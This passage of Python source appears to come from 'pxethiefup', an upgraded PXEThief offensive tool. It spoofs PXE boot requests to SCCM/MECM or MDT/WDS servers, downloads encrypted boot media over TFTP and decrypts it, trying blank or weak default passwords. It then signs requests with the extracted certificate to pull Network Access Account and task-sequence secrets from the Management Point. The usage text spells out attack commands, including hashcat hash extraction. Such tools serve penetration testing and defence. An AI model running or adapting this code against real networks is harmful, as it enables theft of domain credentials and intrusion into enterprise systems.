        # x64 private option
        (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")),

        # x86 private option
        # (250,binascii.unhexlify("0d0208000e010101020006050400000006ff")),

        ('vendor_class_id', b'PXEClient'), 

    # Required by SCCM/MECM PXE responders (tspxe.dll): without DHCP option 97 (client
    # machine identifier / UUID) the DP does not answer the port 4011 request at all.
    # The UUID need not match a real machine; SCCM treats it as an unknown computer.
        ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'), 
        "end"]
    )
    """
     sr return value: 
        ans, 
        unans/packetpair1,
        packetpair2 (i.e. PacketPairList)/sent packet,
        received packet/Layers(Ethernet,IP,UDP/TCP,BOOTP,DHCP)
    """

    ans = sr1(
        pkt,
        timeout=10,
        filter="udp port 4011 or udp port 68"
    ) 

    encrypted_key = None
    if ans:
        packet = ans
        dhcp_options = packet[1][DHCP].options
    
        # Option 243 is the DHCP option for SCCM supply the Variable File Location
        # Does the received packet contain DHCP Option 243? DHCP option 243 is used by SCCM to send the variable file location

        # Debug
        if (VERBOSE):
            print_nice("Received DHCP response from PXE server with the following options:", "INFO")
            for i in dhcp_options:
                if isinstance(i, tuple):
                    key = i[0]
                    value = i[1]
                    if (isinstance(value, bytes)):
                        try:
                            value = value.rstrip(b"\0").decode("utf-8")
                        except UnicodeDecodeError:
                            value = value.hex()
                    print(f"\t{key}: {value}")

        # Build a safe lookup of DHCP options by code so an absent option
        # doesn't raise (the old code used next() on option 252 which throws
        # StopIteration when the server omits it).
        options_by_code = {}
        for opt in dhcp_options:
            if isinstance(opt, tuple) and len(opt) == 2:
                options_by_code[opt[0]] = opt[1]

        # The PXE response determines which deployment system the server is and
        # which workflow to run:
        #   - SCCM/MECM: DHCP option 243 carries the encrypted media variables
        #     file (.var/.dat) location (sometimes with an embedded key), and
        #     option 252 carries the BCD location. We decrypt the variables and
        #     talk to the Management Point.
        #   - MDT/WDS: there is no option 243; option 252 carries a BCD that
        #     points at a WIM boot image (e.g. LiteTouchPE_x64.wim). We download
        #     the BCD, parse it for the WIM path, then pull the WIM (whose
        #     Bootstrap.ini may contain UNC paths / domain credentials).
        variables_file_raw = options_by_code.get(243)
        bcd_file_raw = options_by_code.get(252)

        # Decode the BCD path (option 252) if present (used by both modes).
        bcd_file = None
        if bcd_file_raw is not None:
            bcd_file = bcd_file_raw.rstrip(b"\0").decode("utf-8")

        if variables_file_raw is not None:
            # --- SCCM/MECM mode ---
            # First byte = type, second byte = length, then TLV payload.
            packet_type = variables_file_raw[0]
            data_length = variables_file_raw[1]

            # If the first byte is set to 1, this is the location of the
            # encrypted media file on the TFTP server (variables.dat)
            if packet_type == 1:
                variables_file = variables_file_raw[2:2+data_length].decode('utf-8')

            # If the first byte is set to 2, this is the encrypted key stream
            # used to encrypt the media file; the media file location follows.
            elif packet_type == 2:
                encrypted_key = variables_file_raw[2:2+data_length]
                string_length_index = 2 + data_length + 1
                beginning_of_string_index = 2 + data_length + 2
                string_length = variables_file_raw[string_length_index]
                variables_file = variables_file_raw[beginning_of_string_index:beginning_of_string_index+string_length].decode('utf-8')
            else:
                print_nice(f"Unrecognised SCCM option 243 packet type {packet_type}", "ERROR")
                return None

            if bcd_file is None:
                print_nice("SCCM PXE response did not include a BCD file location (DHCP option 252)", "ERROR")
                return None

            if encrypted_key:
                BLANK_PASSWORDS_FOUND = True
                print_nice("Blank password on PXE boot found!")
                if (VERBOSE):
                    print_nice(f"Encrypted Key: {encrypted_key.hex()}", "INFO")

            print_nice(f"Variables File Location: {variables_file}")
            print_nice(f"BCD File Location: {bcd_file}")
            return {
                "mode": "sccm",
                "variables_file": variables_file,
                "bcd_file": bcd_file,
                "encrypted_key": encrypted_key,
            }

        elif bcd_file is not None:
            # --- MDT/WDS mode (no SCCM option 243, BCD-only response) ---
            print_nice("No SCCM variables file (DHCP option 243); BCD-only response detected - treating as MDT/WDS deployment server.", "INFO")
            print_nice(f"BCD File Location: {bcd_file}")
            return {
                "mode": "mdt_wds",
                "variables_file": None,
                "bcd_file": bcd_file,
                "encrypted_key": None,
            }
        else:
            print_nice("No variable file location (DHCP option 243) or BCD (option 252) found in the received packet when the PXE boot server was prompted for a download location", "ERROR")
            return None
    else:
        print_nice(f"No DHCP responses recieved from MECM server {tftp_server}", "ERROR")
        print_nice(f"This may indicate that the wrong IP address was provided or that there are firewall restrictions blocking DHCP packets to the required ports", "ERROR")
        return None

def download_pxe_file(tftp_server_ip, remote_path, local_path):
    # Download a single file from the PXE TFTP share. Uses the scapy-based
    # downloader first (it bypasses the Windows Firewall via libpcap/Npcap), and
    # falls back to tftpy if that fails. Returns True on success.
    if not download_file_tftp_scapy(tftp_server_ip, remote_path, local_path):
        print_nice("scapy TFTP downloader failed, falling back to tftpy...", "INFO")
        try:
            tftp_client = tftpy.TftpClient(tftp_server_ip, 69)
            tftp_client.download(remote_path, local_path)
        except Exception as e:
            print_nice(f"TFTP download of '{remote_path}' failed: {e}", "ERROR")
            return False
    return True

def get_pxe_files(ip):
    if ip == None:
        # If not, discover via DHCP
        print_nice("Discovering PXE Server through DHCP...")
        # Scan for PXE Server
        tftp_server_ip = find_pxe_server()
        if tftp_server_ip is None:
            print_nice("Failed to find PXE server via DHCP", "ERROR")
            return False
        else:
            print_nice(f"PXE Server found from DHCP at {tftp_server_ip}")
    else:
        # If IP is supplied by the user
        print_nice(f"Targeting user-specified host: {ip}")
        # Target the specified host
        tftp_server_ip = validate_ip_or_resolve_hostname(ip)
        if (tftp_server_ip is None):
            print_nice(f"Failed to resolve hostname or validate IP address: {ip}", "ERROR")
            return False

    # Try and get the variables from the PXE server.
    # SCCM's PXE responder can rate-limit / cool down repeated requests from the
    # same client identity (the option 97 UUID + MAC are fixed in this tool), so a
    # fresh run shortly after a previous one can get no answer. Retry a few times.
    MAX_PXE_RETRIES = 3
    PXE_RETRY_DELAY = 10
    answer_array = None
    for attempt in range(1, MAX_PXE_RETRIES + 1):
        answer_array = get_variable_file_path(tftp_server_ip)
        if answer_array is not None:
            break
        if attempt < MAX_PXE_RETRIES:
            print_nice(f"No PXE response on attempt {attempt}/{MAX_PXE_RETRIES}; waiting {PXE_RETRY_DELAY}s before retry...", "INFO")
            time.sleep(PXE_RETRY_DELAY)
    if answer_array is None:
        print_nice("Failed to get variable file path from PXE server", "ERROR")
        return False

    pxe_info = answer_array

    # ------------------------------------------------------------------
    # Branch on the detected PXE server type.
    # ------------------------------------------------------------------
    if pxe_info["mode"] == "sccm":
        return _get_pxe_files_sccm(tftp_server_ip, pxe_info)
    elif pxe_info["mode"] == "mdt_wds":
        return _get_pxe_files_mdt_wds(tftp_server_ip, pxe_info)
    else:
        print_nice(f"Unrecognised PXE response mode: {pxe_info['mode']}", "ERROR")
        return False

def _get_pxe_files_sccm(tftp_server_ip, pxe_info):
    # SCCM/MECM flow: download the encrypted variables file + BCD, decrypt the
    # variables, then talk to the Management Point to pull and decrypt policies.
    global WORKING_DIR

    variables_file = pxe_info["variables_file"]
    bcd_file = pxe_info["bcd_file"]
    encrypted_key = pxe_info["encrypted_key"]

    variables_filename = variables_file.split("\\")[-1]
    bcd_filename = bcd_file.split("\\")[-1]

    # If the BCD validated file contains a blank password, use it
    if BLANK_PASSWORDS_FOUND:
        write_to_file(WORKING_DIR, "encrypted_key.hex", encrypted_key, "binary")

    variables_file_location = os.path.join(WORKING_DIR, variables_filename)
    bcd_file_location = os.path.join(WORKING_DIR, bcd_filename)

    # Verify if the working directory exists
    if not os.path.exists(WORKING_DIR):
        os.makedirs(WORKING_DIR)

    # SCCM materialises the SMSTemp\<id>.var / .bcd files on the TFTP share on
    # demand in response to the PXE request. Wait for them to be published before
    # pulling them, otherwise the first TFTP read can race the server writing them.
    print_nice("Waiting 20 seconds for the PXE media to be published to the TFTP share before downloading...", "INFO")
    time.sleep(20)

    # Download the variables file and BCD over TFTP.
    download_pxe_file(tftp_server_ip, variables_file, variables_file_location)
    download_pxe_file(tftp_server_ip, bcd_file, bcd_file_location)

    # Parse the downloaded BCD to surface the boot configuration (boot WIM path,
    # ramdisk TFTP settings, etc.). Non-fatal: a parse failure doesn't abort.
    if (VERBOSE):
        print_nice("Parsing downloaded BCD file...", "INFO")
        try:
            parse_bcd(bcd_file_location)
        except Exception as e:
            print_nice(f"BCD parse failed (non-fatal): {e}", "ERROR")

    if BLANK_PASSWORDS_FOUND:
        # If a Blank Password is found for the media
        print_nice("Attempting automatic exploitation.", "INFO")
        decrypted_media_variables = decrypt_pxe_media_from_encrypted_key(encrypted_key, variables_file_location)
    else:
        # If a defined password is used for the media
        print_nice("User configured password detected for task sequence media.", "INFO")
        response, decrypted_media_variables, resolved_password = test_default_weak_passwords_on_media(variables_file_location)

    # Capture the pre-extraction working directory ("loot"). The PXE originals
    # (encrypted_key, .var, .bcd) and the decrypted variables.xml are written
    # there before the per-media WORKING_DIR is known. After the MP connection
    # completes they are relocated into the per-media folder for tidy loot org.
    initial_working_dir = WORKING_DIR

    if decrypted_media_variables is not None:
        print_nice("Writing media variables to variables.xml", "INFO")
        write_to_file(WORKING_DIR, "variables", decrypted_media_variables)
        smsMediaGuid, smsTSMediaPFX = extract_key_information_from_variables(decrypted_media_variables)
        download_and_decrypt_policies_using_certificate(smsMediaGuid, smsTSMediaPFX)

        # Tidy up: move the original PXE material from the initial loot root into
        # the per-media working folder now that it exists. Originals go to
        # original_files/, and the decrypted variables.xml moves to the folder root.
        if WORKING_DIR != initial_working_dir:
            originals_dir = os.path.join(WORKING_DIR, "original_files")
            # encrypted_key (only present on the blank-password path)
            if BLANK_PASSWORDS_FOUND:
                enc_key_src = os.path.join(initial_working_dir, "encrypted_key")
                if os.path.exists(enc_key_src):
                    copy_file_to_dir(enc_key_src, originals_dir, delete_original=True)
            # The raw .var and .bcd as downloaded from the TFTP share
            if os.path.exists(variables_file_location):
                copy_file_to_dir(variables_file_location, originals_dir, delete_original=True)
            if os.path.exists(bcd_file_location):
                copy_file_to_dir(bcd_file_location, originals_dir, delete_original=True)
            # Decrypted variables.xml -> per-media folder root
            variables_xml_src = os.path.join(initial_working_dir, "variables.xml")
            if os.path.exists(variables_xml_src):
                copy_file_to_dir(variables_xml_src, WORKING_DIR, delete_original=True)
            if (VERBOSE):
                print_nice(f"Relocated original PXE files into {WORKING_DIR}", "SUCCESS")
    else:
        print_nice("Failed to decrypt media variable file", "ERROR")

    return True

def _get_pxe_files_mdt_wds(tftp_server_ip, pxe_info):
    # MDT/WDS flow: there is no SCCM variables file. Download the BCD, parse it
    # to find the referenced WIM boot image (e.g. LiteTouchPE_x64.wim), and pull
    # that WIM. The WIM's Bootstrap.ini (extract with 7zip/dism) may contain the
    # MDT DeployRoot UNC path and domain join credentials. Modeled on
    # garrettfoster13's wtftp.py.
    global WORKING_DIR

    bcd_file = pxe_info["bcd_file"]
    bcd_filename = bcd_file.split("\\")[-1]

    # Use a dedicated loot folder for the MDT/WDS material
    mdt_working_dir = os.path.join(WORKING_DIR, "mdt_wds")
    if not os.path.exists(mdt_working_dir):
        os.makedirs(mdt_working_dir)

    bcd_file_location = os.path.join(mdt_working_dir, bcd_filename)

    # No need for the SCCM publish wait; MDT/WDS serves the BCD statically.
    print_nice(f"Downloading BCD from TFTP: {bcd_file}", "INFO")
    if not download_pxe_file(tftp_server_ip, bcd_file, bcd_file_location):
        print_nice("Failed to download BCD file", "ERROR")
        return False

    # Parse the BCD to surface its configuration and locate the boot WIM path.
    print_nice("Parsing downloaded BCD file...", "INFO")
    wim_path = None
    try:
        wim_path = parse_bcd(bcd_file_location)
    except Exception as e:
        print_nice(f"BCD parse failed: {e}", "ERROR")

    if wim_path:
        wim_filename = wim_path.split("\\")[-1]
        wim_location = os.path.join(mdt_working_dir, wim_filename)
        print_nice(f"Boot WIM found in BCD: {wim_path}", "SUCCESS")
        print_nice(f"Downloading WIM from TFTP: {wim_path} (this can be slow for large images)", "INFO")
        if download_pxe_file(tftp_server_ip, wim_path, wim_location):
            print_nice(f"WIM saved to {wim_location}", "SUCCESS")
            print_nice("Extract the contents with a tool like 7zip/dism and inspect Bootstrap.ini / CustomSettings.ini for DeployRoot UNC paths and domain credentials.", "INFO")
        else:
            print_nice("Failed to download WIM file", "ERROR")
    else:
        print_nice("No boot WIM path found in the BCD; nothing further to download.", "INFO")

    return True

def download_and_decrypt_policies_using_certificate(guid, cert_bytes):
    #Parse the downloaded task sequences and extract sensitive data if present
    smsMediaGuid = guid
    CCMClientID = smsMediaGuid
    smsTSMediaPFX = binascii.unhexlify(cert_bytes)
    
    key, cert = load_pfx(smsTSMediaPFX, smsMediaGuid[:31].encode())
    if (VERBOSE):
            print_nice('Generating Client Authentication headers using PFX File', "INFO")

    data = CCMClientID.encode("utf-16-le") + b'\x00\x00'
    CCMClientIDSignature = CryptoTools.sign(key, data)
    if (VERBOSE):
        print_nice("CCMClientID Signature Generated", "INFO")

    CCMClientTimestamp = dt.datetime.now(dt.UTC).replace(microsecond=0).isoformat()+'Z'
    data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
    CCMClientTimestampSignature = CryptoTools.sign(key, data)
    if (VERBOSE):
        print_nice("CCMClientTimestamp Signature Generated", "INFO")

    clientToken = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
    clientTokenSignature = CryptoTools.sign(key, clientToken).hex().upper()
    if (VERBOSE):
        print_nice("ClientToken Signature Generated", "INFO")

    # Add a pre-flight check for the HTTP requests
    valid_host = validate_ip_or_resolve_hostname(SCCM_BASE_URL)
    if valid_host is None:
        print_nice("Please check your DNS settings or use the target flag to set the Management Point URL.", "INFO")
        return

    try:
        naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(
            CCMClientID,
            CCMClientIDSignature,
            CCMClientTimestamp,
            CCMClientTimestampSignature,
            clientTokenSignature,
            key
        )
    
    except Exception as e:
        print("If you encountered errors at this point, it is likely as a result of one of two things: a) network connectivity or b) the signing algorithm\n")
        print("Fix network connectivity issues by ensuring you can connect to the HTTP port on the server and fixing DNS issues or by using the SCCM_BASE_URL to hardcode the beginning of the URL used to access the MP: e.g. http://192.168.56.101\n")
        # This should be worth reviewing more in depth, this could be caught another way for sure?
        print("The SHA1 signing algorithm is implemented by generateSignedData and the SHA256 signing algorithm is implemented by generateClientTokenSignature\n")
        print("If you encountered errors, for CCMClientIDSignature, CCMClientTimestampSignature and clientTokenSignature change the current signing algorithm to the one not in use")
        print(e)
        return

    # # Processing the unknown computer collections for secrets
    # # Collection Settings
    # if (colsettings is not None) and (len(colsettings) > 0):
    #     if (VERBOSE):
    #         print_nice("Processing Collection Settings for collection", "INFO")
    #     for colsetting in colsettings:
    #         # Again, this can be done in a better way for sure
    #         write_to_file(WORKING_DIR, "CollectionSettings", colsetting, "xml")

    #         credential_processing_result.process_xml(colsetting, "collection_settings")

    # # Network Access Accounts
    # if (VERBOSE):
    #     print_nice("Processing Network Access Account Configurations", "INFO")
    # for naaConfig in naaConfigs:
    #     credential_processing_result.process_xml(naaConfig, "naa")

    # # Task Sequences Accounts
    # if (VERBOSE):
    #     print_nice("Processing Task Sequence Configuration", "INFO")
    # for tsConfig in tsConfigs:
    #     credential_processing_result.process_xml(tsConfig, "task_sequence")

    # credential_processing_result.print_all_credentials()

    parse_files_for_credentials(media_variables = naaConfigs, policies = tsConfigs, collection_settings = colsettings)

## BCD File Parsing
## ------------------
# BCD (Boot Configuration Data) files are Windows registry hives. This parser
# opens them with python-registry, maps the well-known object GUIDs and element
# type codes to friendly names, and decodes the element values (UTF-16LE paths,
# short strings, hex for small binary, size for larger binary). Adapted from the
# partial fork, which credited garrettfoster13's wtftp.py and mattifestation's
# BCD PowerShell module.
#
# BCD GUID values
# From http://www.mistyprojects.co.uk/documents/BCDEdit/files/bcd_as_registry_hive.htm
bcd_guids = {
    "{9dea862c-5cdd-4e70-acc1-f32b344d4795}": "Windows Boot Manager",
    "{3afd365b-4349-11e3-b0da-a722f0df0a34}": "Windows Boot Loader (OS)",
    "{3afd365c-4349-11e3-b0da-a722f0df0a34}": "Windows Boot Loader (WinRE)",
    "{3afd365a-4349-11e3-b0da-a722f0df0a34}": "Resume from Hibernate",
    "{b2721d73-1db4-4c62-bf78-c548a880142d}": "Windows Memory Tester",
    "{0ce4991b-e6b3-4b16-b23c-5e0d9250e5d9}": "EMS Settings",
    "{4636856e-540f-4170-a130-a84776f4c654}": "Debugger Settings",
    "{5189b25c-5558-4bf2-bca4-289b11bd29e2}": "RAM Defects",
    "{7ea2e1ac-2e61-4728-aaa3-896d9d0a9f0e}": "Global Settings",
    "{6efb52bf-1766-41db-a6b3-0ee5eff72bd7}": "Boot Loader Settings",
    "{7ff607e0-4395-11db-b0de-0800200c9a66}": "Hypervisor Settings",
    "{1afa9c49-16ab-4a5c-901b-212802da9460}": "Resume Loader Settings",
    "{3afd365d-4349-11e3-b0da-a722f0df0a34}": "Device options",
}

# https://github.com/mattifestation/BCD/blob/master/BCD/BCD.psm1
ElementInheritableNameMapping = {
    "11000001" : 'Device',
    "12000002" : 'Path',
    "12000004" : 'Description',
    "12000005" : 'Locale',
    "14000006" : 'Inherit',
    "15000007" : 'TruncateMemory',
    "14000008" : 'RecoverySequence',
    "16000009" : 'RecoveryEnabled',
    "1700000A" : 'BadMemoryList',
    "1600000B" : 'BadMemoryAccess',
    "1500000C" : 'FirstMegabytePolicy',
    "1500000D" : 'RelocatePhysical',
    "1500000E" : 'AvoidLowMemory',
    "1600000F" : 'TraditionalKseg',
    "16000010" : 'BootDebug',
    "15000011" : 'DebugType',
    "15000012" : 'DebugAddress',
    "15000013" : 'DebugPort',
    "15000014" : 'BaudRate',
    "15000015" : 'Channel',
    "12000016" : 'TargetName',
    "16000017" : 'NoUMEx',
    "15000018" : 'DebugStart',
    "12000019" : 'BusParams',
    "1500001A" : 'HostIP',
    "1500001B" : 'Port',
    "1600001C" : 'DHCP',
    "1200001D" : 'Key',
    "1600001E" : 'VM',
    "16000020" : 'BootEMS',
    "15000022" : 'EMSPort',
    "15000023" : 'EMSBaudRate',
    "12000030" : 'LoadOptions',
    "16000031" : 'AttemptNonBcdStart',
    "16000040" : 'AdvancedOptions',
    "16000041" : 'OptionsEdit',
    "15000042" : 'KeyringAddress',
    "11000043" : 'BootStatusDataLogDevice',
    "12000044" : 'BootStatusDataLogPath',
    "16000045" : 'PreserveBootStat',
    "16000046" : 'GraphicsModeDisabled',
    "15000047" : 'ConfigAccessPolicy',
    "16000048" : 'NoIntegrityChecks',
    "16000049" : 'TestSigning',
    "1200004A" : 'FontPath',
    "1500004B" : 'IntegrityServices',
    "1500004C" : 'VolumeBandId',
    "16000050" : 'ExtendedInput',
    "15000051" : 'InitialConsoleInput',
    "15000052" : 'GraphicsResolution',
    "16000053" : 'RestartOnFailure',
    "16000054" : 'HighestMode',
    "16000060" : 'IsolatedContext',
    "15000065" : 'DisplayMessage',
    "15000066" : 'DisplayMessageOverride',
    "16000067" : 'NoBootUxLogo',
    "16000068" : 'NoBootUxText',
    "16000069" : 'NoBootUxProgress',
    "1600006A" : 'NoBootUxFade',
    "1600006B" : 'BootUxReservePoolDebug',
    "1600006C" : 'BootUxDisabled',
    "1500006D" : 'BootUxFadeFrames',
    "1600006E" : 'BootUxDumpStats',
    "1600006F" : 'BootUxShowStats',
    "16000071" : 'MultiBootSystem',
    "16000072" : 'NoKeyboard',
    "15000073" : 'AliasWindowsKey',
    "16000074" : 'BootShutdownDisabled',
    "15000075" : 'PerformanceFrequency',
    "15000076" : 'SecurebootRawPolicy',
    "17000077" : 'AllowedInMemorySettings',
    "15000079" : 'BootUxtTransitionTime',
    "1600007A" : 'MobileGraphics',
    "1600007B" : 'ForceFipsCrypto',
    "1500007D" : 'BootErrorUx',
    "1600007E" : 'FlightSigning',
    "1500007F" : 'MeasuredBootLogFormat',
    "25000001" : 'PassCount',
    "25000003" : 'FailureCount',
    "26000202" : 'SkipFFUMode',
    "26000203" : 'ForceFFUMode',
    "25000510" : 'ChargeThreshold',
    "26000512" : 'OffModeCharging',
    "25000AAA" : 'Bootflow',
    "24000001" : 'DisplayOrder',
    "24000002" : 'BootSequence',
    "23000003" : 'Default',
    "25000004" : 'Timeout',
    "26000005" : 'AttemptResume',
    "23000006" : 'ResumeObject',
    "24000010" : 'ToolsDisplayOrder',
    "26000020" : 'DisplayBootMenu',
    "26000021" : 'NoErrorDisplay',
    "21000022" : 'BcdDevice',
    "22000023" : 'BcdFilePath',
    "26000028" : 'ProcessCustomActionsFirst',
    "27000030" : 'CustomActionsList',
    "26000031" : 'PersistBootSequence',
    "21000001" : 'FileDevice',
    "22000002" : 'FilePath',
    "26000006" : 'DebugOptionEnabled',
    "25000008" : 'BootMenuPolicy',
    "26000010" : 'DetectKernelAndHal',
    "22000011" : 'KernelPath',
    "22000012" : 'HalPath',
    "22000013" : 'DbgTransportPath',
    "25000020" : 'NX',
    "25000021" : 'PAEPolicy',
    "26000022" : 'WinPE',
    "26000024" : 'DisableCrashAutoReboot',
    "26000025" : 'UseLastGoodSettings',
    "26000027" : 'AllowPrereleaseSignatures',
    "26000030" : 'NoLowMemory',
    "25000031" : 'RemoveMemory',
    "25000032" : 'IncreaseUserVa',
    "26000040" : 'UseVgaDriver',
    "26000041" : 'DisableBootDisplay',
    "26000042" : 'DisableVesaBios',
    "26000043" : 'DisableVgaMode',
    "25000050" : 'ClusterModeAddressing',
    "26000051" : 'UsePhysicalDestination',
    "25000052" : 'RestrictApicCluster',
    "26000054" : 'UseLegacyApicMode',
    "25000055" : 'X2ApicPolicy',
    "26000060" : 'UseBootProcessorOnly',
    "25000061" : 'NumberOfProcessors',
    "26000062" : 'ForceMaximumProcessors',
    "25000063" : 'ProcessorConfigurationFlags',
    "26000064" : 'MaximizeGroupsCreated',
    "26000065" : 'ForceGroupAwareness',
    "25000066" : 'GroupSize',
    "26000070" : 'UseFirmwarePciSettings',
    "25000071" : 'MsiPolicy',
    "25000080" : 'SafeBoot',
    "26000081" : 'SafeBootAlternateShell',
    "26000090" : 'BootLogInitialization',
    "26000091" : 'VerboseObjectLoadMode',
    "260000a0" : 'KernelDebuggerEnabled',
    "260000a1" : 'DebuggerHalBreakpoint',
    "260000A2" : 'UsePlatformClock',
    "260000A3" : 'ForceLegacyPlatform',
    "250000A6" : 'TscSyncPolicy',
    "260000b0" : 'EmsEnabled',
    "250000c1" : 'DriverLoadFailurePolicy',
    "250000C2" : 'BootMenuPolicy',
    "260000C3" : 'AdvancedOptionsOneTime',
    "250000E0" : 'BootStatusPolicy',
    "260000E1" : 'DisableElamDrivers',
    "250000F0" : 'HypervisorLaunchType',
    "260000F2" : 'HypervisorDebugEnabled',
    "250000F3" : 'HypervisorDebugType',
    "250000F4" : 'HypervisorDebugPort',
    "250000F5" : 'HypervisorBaudrate',
    "250000F6" : 'HypervisorDebug1394Channel',
    "250000F7" : 'BootUxPolicy',
    "220000F9" : 'HypervisorDebugBusParams',
    "250000FA" : 'HypervisorNumProc',
    "250000FB" : 'HypervisorRootProcPerNode',
    "260000FC" : 'HypervisorUseLargeVTlb',
    "250000FD" : 'HypervisorDebugNetHostIp',
    "250000FE" : 'HypervisorDebugNetHostPort',
    "25000100" : 'TpmBootEntropyPolicy',
    "22000110" : 'HypervisorDebugNetKey',
    "26000114" : 'HypervisorDebugNetDhcp',
    "25000115" : 'HypervisorIommuPolicy',
    "2500012b" : 'XSaveDisable',
    "35000001" : 'RamdiskImageOffset',
    "35000002" : 'TftpClientPort',
    "31000003" : 'RamdiskSdiDevice',
    "32000004" : 'RamdiskSdiPath',
    "35000005" : 'RamdiskImageLength',
    "36000006" : 'RamdiskExportAsCd',
    "36000007" : 'RamdiskTftpBlockSize',
    "36000008" : 'RamdiskTftpWindowSize',
    "36000009" : 'RamdiskMulticastEnabled',
    "3600000A" : 'RamdiskMulticastTftpFallback',
    "3600000B" : 'RamdiskTftpVarWindow',
    "45000001" : 'DeviceType',
    "42000002" : 'ApplicationRelativePath',
    "42000003" : 'RamdiskDeviceRelativePath',
    "46000004" : 'OmitOsLoaderElements',
    "47000006" : 'ElementsToMigrate',
    "46000010" : 'RecoveryOs',
}

def decode_bcd_value(val):
    """Decode a BCD registry element value to a readable, console-safe string."""
    if isinstance(val, bytes):
        # Search for a UTF-16LE path (backslash = 0x5C 0x00) and decode from there
        idx = val.find(b'\x5c\x00')
        if idx != -1:
            try:
                decoded = val[idx:].decode('utf-16le').rstrip('\x00')
                return _safe_str(decoded)
            except Exception:
                pass
        # Try a full UTF-16LE decode for short strings. Only accept it if the
        # result is printable AND encodable on the Windows console (cp1252),
        # otherwise fall through to hex/size so binary data doesn't crash rich.
        if len(val) < 100:
            try:
                decoded = val.decode('utf-16le').rstrip('\x00')
                if decoded.isprintable():
                    return _safe_str(decoded)
            except Exception:
                pass
        # Hex for small binary values
        if len(val) <= 8:
            return val.hex()
        return f"<{len(val)} bytes>"
    return _safe_str(val) if isinstance(val, str) else val

def parse_bcd(bcd_file):
    """Parse a BCD registry hive and print its objects/elements.

    Returns the decoded value of the first element that looks like a boot WIM
    path (contains '.wim'), or None if not found / on error.
    """
    try:
        reg = Registry.Registry(bcd_file)
        objects = reg.root().find_key("Objects")
    except Exception as e:
        print_nice(f"Failed to open BCD as registry hive: {e}", "ERROR")
        return None

    boot_wim = None
    for obj in objects.subkeys():
        obj_name = obj.name()
        description = bcd_guids.get(obj_name.lower(), None)
        # bcd_guids keys are lowercase; fall back to a case-insensitive lookup
        if description is None:
            for guid, desc in bcd_guids.items():
                if obj_name.lower() == guid.lower():
                    description = desc
                    break
        print_nice(f"[Object: {description if description else obj_name}]", "INFO")

        try:
            elements = obj.find_key("Elements")
            for elem in elements.subkeys():
                try:
                    subkey_name = elem.name()
                    for code, friendly_name in ElementInheritableNameMapping.items():
                        if subkey_name.lower() == code.lower():
                            subkey_name = friendly_name
                            break

                    val = elem.value("Element").value()
                    decoded = decode_bcd_value(val)
                    print(_safe_str(f"  {subkey_name}: {decoded}"))

                    # Capture a boot WIM path if present
                    if isinstance(decoded, str) and ".wim" in decoded.lower() and boot_wim is None:
                        boot_wim = decoded
                except Exception:
                    pass
        except Exception:
            pass

    if boot_wim is not None:
        print_nice(f"Boot WIM path: {boot_wim}", "SUCCESS")
    return boot_wim


## Main
## ------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
            prog="pxethiefup", 
            formatter_class=argparse.RawDescriptionHelpFormatter,
            description="An upgraded version of PXEThief used for extracting sensitive data from SCCM/MECM material and servers",
            epilog='''
            Broadcast for DHCP and use PXE to try to download the PXE Materials:
                python3 pxethiefup.py -a
                python3 pxethiefup.py --auto

            Request a target MECM Distribution Point server for PXE Materials:
                python3 pxethiefup.py -m -t 10.1.1.2
                python3 pxethiefup.py --manual -target 10.1.1.2

            Use a specific network interface (scapy int value) when requesting the PXE files from a manual interface:
                python3 pxethiefup.py -m -t 10.1.1.2 -i 73
                python3 pxethiefup.py --manual -target 10.1.1.2 --interface 73

            Search a folder for SCCM media files (including ISO) and decrypt them:
                python pxethiefup.py -d -f "..\\folder\\"
                python pxethiefup.py --decrypt -f "..\\folder\\"

            Decrypt a partial or network based media - Variables file with no password or unknown password:
                python3 pxethiefup.py -d -vf variables.xml
                python3 pxethiefup.py --decrypt --variables variables.xml

            Decrypt a partial or network based media - Variables file using a password:
                python3 pxethiefup.py -d -vf variables.xml -p password123
                python3 pxethiefup.py --decrypt --variables variables.xml --password password123

            Decrypt the full media using a variables and policy file:
                python3 pxethiefup.py -d -vf variables.xml -pf policies.xml -p password123
                python3 pxethiefup.py --decrypt --variables variables.xml --policy policies.xml --password password123

            Decrypt PXE network media using a .var and .bcd file pair:
                python3 pxethiefup.py -d -f "tets"
                python3 pxethiefup.py -d -vf 0000000018.var -bf BUILD00005-01456-00008.bcd
                python3 pxethiefup.py --decrypt --folder "tets"

            Display the hash corresponding to a media variables file for cracking in hashcat:
                python3 pxethiefup.py -c -vf variables.xml
                python3 pxethiefup.py --crack --variables variables.xml

            Parse a BCD (Boot Configuration Data) registry hive:
                python3 pxethiefup.py -b BUILD00005-01456-00008.bcd
                python3 pxethiefup.py --parse-bcd BUILD00005-01456-00008.bcd
                '''
        )

    # PXE Booting Options
    parser.add_argument("-a", "--auto", help="Automatically identify and download encrypted media file using DHCP PXE boot request", action="store_true")
    parser.add_argument("-m", "--manual", help="Coerce PXE Boot against a specific MECM Distribution Point server designated by IP address", action="store_true")
    parser.add_argument("-t", "--target", help="Target IP address of the MECM Distribution Point server", nargs='?')

    parser.add_argument("-u", "--url", help="Manually specify the URL of the MECM Distribution Point server (useful for when you don't have DNS)", nargs='?')

    # Offline Decryption
    # Do I actually need the decrypt flag here, or can I just check for the presence of the other flags?
    parser.add_argument("-d", "--decrypt", help="Decrypt a media variables file and/or policies.xml", action="store_true")

    parser.add_argument("-f", "--folder", help="Folder containing files for decryption", nargs='?')
    parser.add_argument("-vf", "--variables", help="Variable file to decrypt", nargs='?')
    parser.add_argument("-pf", "--policy", help="Policy file to decrypt", nargs='?')
    parser.add_argument("-bf", "--bcd", help="BCD boot configuration file to preserve alongside the variables file", nargs='?')

    parser.add_argument("-p", "--password", help="Password to decrypt the media variables file (for hex input, use 0x prefix)", nargs='?')

    # Utils
    parser.add_argument("-c", "--crack", help="Print the hash corresponding to a specified media variables file for cracking in hashcat", action="store_true")

    # Generic flags
    parser.add_argument("-v", "--verbose", help="Enable verbose output", action="store_true")
    parser.add_argument("-l", "--list-interfaces", help="List available network interfaces", action="store_true")
    parser.add_argument("-i", "--interface", help="Specify the network interface to use (int)", default=None)

    # BCD parsing (standalone)
